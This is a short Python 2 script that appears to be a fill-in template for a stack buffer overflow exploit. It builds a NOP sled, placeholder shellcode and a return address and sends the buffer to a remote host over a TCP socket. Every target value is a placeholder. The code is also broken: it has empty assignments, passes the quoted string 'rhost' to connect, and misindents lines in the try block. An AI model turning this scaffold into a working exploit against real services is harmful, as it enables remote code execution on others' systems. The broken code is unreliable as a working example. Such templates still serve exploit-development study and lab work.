#!/bin/python
import sys,socket

rhost = <IP>
rport = <port>
retaddress = "" # in little endian notation
buffersize =  # in bytes
shellcodesize =  # in bytes
shellcode = (
"<shellcode>")

sled = "\x90" * (buffersize-shellcodesize)
buf = sled + shellcode + retaddress

### try making another section for ret2libc? ROP?

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('rhost',rport))
s.send((buf))
s.close()
except:
	print "Error connecting"
	sys.exit()
